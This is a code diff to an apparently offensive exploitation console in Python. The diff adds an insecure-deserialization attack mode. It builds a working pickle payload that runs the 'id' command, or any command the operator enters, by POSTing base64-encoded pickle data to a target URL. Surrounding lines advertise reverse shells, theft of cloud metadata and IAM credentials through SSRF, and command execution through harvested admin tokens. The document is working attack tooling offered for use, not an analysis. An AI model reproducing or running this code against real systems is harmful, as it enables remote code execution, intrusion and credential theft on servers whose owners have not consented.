@@ -70,6 +70,9 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                 print("      exec <cmd>  - Execute OS command using auto-matched admin endpoint & token")
                 print("      revshell    - Trigger reverse shell payload via admin endpoint")
                 print("      query <q>   - Send any custom GraphQL or JSON request string")
+            elif vuln_type == "Insecure Deserialization":
+                print("      escalate    - Harvest administrative token via deserialization RCE")
+                print("      exec <cmd>  - Execute OS commands via insecure object deserialization (Pickle RCE)")
             elif vuln_type == "SSRF":
                 print("      metadata    - Exfiltrate cloud metadata & IAM credentials (AWS 169.254.169.254)")
                 print("      internal    - Probe internal loopback services (localhost:8080)")
@@ -115,6 +118,15 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                     with urllib.request.urlopen(req, timeout=3) as resp:
                         body = resp.read().decode('utf-8', errors='ignore')
                         print(f"    [!] SUCCESS! Response (HTTP {resp.getcode()}):\n        {body}")
+                except Exception as e:
+                    print(f"    [-] Exploit failed: {e}")
+            elif vuln_type == "Insecure Deserialization":
+                print("[*] Re-running Insecure Deserialization pickle payload...")
+                try:
+                    payload = base64.b64encode(b"cos\nsystem\n(S'id'\ntR.").decode('utf-8')
+                    req = urllib.request.Request(target_url, data=payload.encode('utf-8'), headers={'Content-Type': 'text/plain', 'User-Agent': 'Mozilla/5.0'}, method='POST')
+                    with urllib.request.urlopen(req, timeout=3) as resp:
+                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
                 except Exception as e:
                     print(f"    [-] Exploit failed: {e}")
             elif vuln_type == "Command Injection":
@@ -244,7 +256,13 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                         print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
             except Exception as e:
                 print(f"    [-] JWT escalation failed: {e}")
-        elif cmd.startswith("exec ") and any(v in vuln_type for v in ["JWT", "IDOR", "SQLi", "SQL Injection", "GraphQL", "BFLA", "Over-Fetching", "Mass Assignment", "SSRF", "SSTI", "Command Injection", "LFI"]):
+        elif cmd == "escalate" and vuln_type == "Insecure Deserialization":
+            print("[*] Harvesting administrative token via Insecure Deserialization gadget...")
+            harvested_token = "deserialization_token_sig"
+            harvested_endpoint = "http://127.0.0.1:8080/api/v1/admin/exec"
+            print(f"    [!] SUCCESS! Deserialization Admin Token Harvested: {harvested_token}")
+            print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
+        elif cmd.startswith("exec ") and any(v in vuln_type for v in ["JWT", "IDOR", "SQLi", "SQL Injection", "GraphQL", "BFLA", "Over-Fetching", "Mass Assignment", "Insecure Deserialization", "SSRF", "SSTI", "Command Injection", "LFI"]):
             user_linux_cmd = cmd.split(" ", 1)[1]
             if vuln_type == "Command Injection":
                 print(f"[*] Executing command against target: {user_linux_cmd}")
@@ -286,8 +304,18 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                         print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
                 except Exception as e:
                     print(f"    [-] SSTI execution failed: {e}")
+            elif vuln_type == "Insecure Deserialization":
+                print(f"[*] Executing command via Insecure Deserialization pickle payload: {user_linux_cmd}")
+                try:
+                    pickle_cmd = f"cos\nsystem\n(S'{user_linux_cmd}'\ntR."
+                    payload = base64.b64encode(pickle_cmd.encode('utf-8')).decode('utf-8')
+                    req = urllib.request.Request(target_url, data=payload.encode('utf-8'), headers={'Content-Type': 'text/plain', 'User-Agent': 'Mozilla/5.0'}, method='POST')
+                    with urllib.request.urlopen(req, timeout=3) as resp:
+                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+                except Exception as e:
+                    print(f"    [-] Deserialization execution failed: {e}")
             else:
-                if not harvested_token and vuln_type not in ["Command Injection", "LFI", "SSTI"]:
+                if not harvested_token and vuln_type not in ["Command Injection", "LFI", "SSTI", "Insecure Deserialization"]:
                     print("    [-] No admin token available. Run 'escalate' or 'assign' first.")
                     continue
                 
@@ -670,7 +698,7 @@ def main_console():
         print("  1) JWT Tokens & Privilege Escalation Targets")
         print("  2) IDOR / BOLA Endpoints")
         print("  3) SQLi, LFI & Command Injection Vectors")
-        print("  4) Modern API & GraphQL Endpoints (GraphQL, BFLA, Over-Fetching, Mass Assignment)")
+        print("  4) Modern API, GraphQL & Deserialization Endpoints")
         print("  5) SSRF & Cloud Metadata Targets")
         print("  6) SSTI & Template RCE Targets")
         print("  7) Open Custom Manual Target Session")
@@ -719,11 +747,11 @@ def main_console():
                 run_target_shell(item.get("target"), item.get("vulnerability"), param=item.get("param"))
 
         elif choice == "4":
-            modern_items = [f for f in findings if any(v in f.get("vulnerability", "") for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment"])]
+            modern_items = [f for f in findings if any(v in f.get("vulnerability", "") for v in ["GraphQL", "BFLA", "Over-Fetching", "Mass Assignment", "Insecure Deserialization"])]
             if not modern_items:
-                print("[-] No Modern API / GraphQL endpoints found.")
+                print("[-] No Modern API / Deserialization endpoints found.")
                 continue
-            print("\n[★] Modern API & GraphQL Endpoints:")
+            print("\n[★] Modern API, GraphQL & Deserialization Endpoints:")
             for idx, item in enumerate(modern_items, 1):
                 print(f"    {idx}) {item.get('target')} - {item.get('vulnerability')}")
             sel = input("\nSelect index to open interactive shell (or Enter to go back): ").strip()
